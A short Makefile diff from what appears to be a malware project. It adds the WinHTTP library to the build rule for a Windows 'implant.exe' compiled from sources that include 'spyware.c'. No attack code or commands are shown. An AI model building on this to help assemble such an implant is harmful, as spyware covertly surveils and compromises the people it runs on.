@@ -51,7 +51,7 @@ $(WIN_DIR)/implant.exe: src/implant.c src/protocol.c src/tls.c \
 	    src/implant.c src/protocol.c src/tls.c src/implant_utils.c src/spyware.c \
 	    -o $@ \
 	    -L $(OPENSSL_WIN_LIB) \
-	    -lssl -lcrypto -lws2_32 -lcrypt32 -lbcrypt -lgdi32 -luser32 -lwtsapi32 -ladvapi32 \
+	    -lssl -lcrypto -lws2_32 -lcrypt32 -lbcrypt -lgdi32 -luser32 -lwtsapi32 -ladvapi32 -lwinhttp \
 	    -mwindows \
 	    -static
 
